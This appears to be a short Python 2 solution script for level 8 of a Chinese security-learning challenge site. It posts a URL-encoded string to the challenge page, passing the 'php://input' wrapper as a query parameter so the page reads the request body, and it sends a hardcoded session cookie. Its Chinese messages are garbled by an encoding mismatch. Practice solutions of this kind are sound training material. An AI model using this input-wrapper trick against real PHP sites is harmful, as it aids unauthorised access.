# coding:gbk
import urllib
try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requestsģ�鵼�����,��ִ��pip install requests��װ!')
try:
    print '\n������Ϣ��ȫ����ѧϰƽ̨�ű��ص�8��\n'
    s = requests.Session()
    url = 'http://1.hacklist.sinaapp.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^.^=php://input'
    header = {'Cookie': 'saeut=218.108.135.246.1416190347811282; PHPSESSID=5f3d9f5685452d1474f59371067e36af'}
    r = s.post(url, data=urllib.unquote("%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29"), headers=header)
    print r.content
except KeyboardInterrupt:
    raise SystemExit('��ү,�����ķԸ�,�ѳɹ��˳���')